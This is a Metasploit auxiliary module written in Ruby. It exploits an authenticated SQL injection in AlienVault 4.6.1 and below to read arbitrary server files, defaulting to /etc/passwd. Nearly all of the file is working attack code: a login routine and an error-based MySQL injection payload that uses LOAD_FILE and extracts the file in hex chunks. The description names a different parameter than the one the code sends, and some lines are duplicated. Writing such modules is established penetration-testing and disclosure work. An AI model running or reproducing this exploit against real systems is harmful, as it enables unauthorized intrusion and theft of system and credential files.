##
## This module requires Metasploit: http//metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
 
require 'msf/core'
 
class Metasploit4 < Msf::Auxiliary
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      'Name'           => "AlienVault Authenticated SQL Injection Arbitrary File Read",
      'Description'    => %q{
        AlienVault 4.6.1 and below is susceptible to an authenticated SQL injection attack against
        newpolicyform.php using the 'insertinto' parameter.  This module exploits the
        lack of input filtering to read an arbitrary file from the file system.
        Any authenticated user is able to exploit this, as administrator
        privileges are not required.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Chris Hebert <chrisdhebert[at]gmail.com>'
        ],
      'References'     =>
        [
          ['EDB', '#####TBD####']
        ],
      'DefaultOptions'  =>
        {
          'SSL' => true
        },
      'Platform'       => ['linux'],
      'Privileged'     => false,
      'DisclosureDate' => "May 9 2014"))
 
      register_options(
      [
        Opt::RPORT(443),
        OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd' ]),
        OptString.new('USERNAME', [ true, 'Single username' ]),
        OptString.new('PASSWORD', [ true, 'Single password' ]),
        OptString.new('TARGETURI', [ true, 'Relative URI of installation', '/' ])
      ], self.class)
 
  end
 
  def run
 
    print_status("#{peer} - Get a valid session cookie...")
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php')
    })
 
    unless res and res.code == 200
      print_error("#{peer} - Server did not respond in an expected way")
      return
    end
 
    cookie = res.get_cookies
 
    if cookie.blank?
      print_error("#{peer} - Could not retrieve a cookie")
      return
    end
 
    post = {
      'embed' => '',
      'bookmark_string' => '',
      'user' => datastore['USERNAME'],
      'passu' => datastore['PASSWORD'],
      'pass' => Rex::Text.encode_base64(datastore['PASSWORD'])
    }
 
    print_status("#{peer} - Login...")
 
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php'),
      'method' => 'POST',
      'vars_post' => post,
      'cookie' => cookie
    })
 
    unless res and res.code == 302
      print_error("#{peer} - Server did not respond in an expected way")
      return
    end
 
    unless res.headers['Location'] && res.headers['Location'] == normalize_uri(target_uri.path, 'ossim/')
      print_error("#{peer} - Authentication failed")
      return
    end
 
    cookie = res.get_cookies
 
    if cookie.blank?
      print_error("#{peer} - Could not retrieve the authenticated cookie")
      return
    end
 
    i = 0
    full = ''
    filename = datastore['FILEPATH'].unpack("H*")[0]
    i = 0
    full = ''
    filename = datastore['FILEPATH'].unpack("H*")[0]
    left_marker = Rex::Text.rand_text_alpha(6)
    right_marker = Rex::Text.rand_text_alpha(6)
 
    print_status("#{peer} - Exploiting SQLi...")
 
    loop do
      file = sqli(left_marker, right_marker, i, cookie, filename)
      return if file.nil?
      break if file.empty?
 
      str = [file].pack("H*")
      full << str
      vprint_status(str)
 
      i = i+1
    end
 
    path = store_loot('alienvault.file', 'text/plain', datastore['RHOST'], full, datastore['FILEPATH'])
    print_good("File stored at path: " + path)
  end
 
  def sqli(left_marker, right_marker, i, cookie, filename)
    pay =  "X') AND (SELECT 1170 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},"
    pay << "(SELECT MID((IFNULL(CAST(HEX(LOAD_FILE(0x#{filename})) AS CHAR),"
    pay << "0x20)),#{(50*i)+1},50)),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS"
    pay << " GROUP BY x)a) AND ('xnDa'='xnDa"
 
    get = {
      'insertafter' => pay,
    }
 
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'ossim', 'policy', 'newpolicyform.php'),
      'cookie' => cookie,
      'vars_get' => get
    })
 
    if res and res.body and res.body =~ /#{left_marker}(.*)#{right_marker}/
      return $1
    else
      print_error("Server did not respond in an expected way")
      return nil
    end
  end
 
end
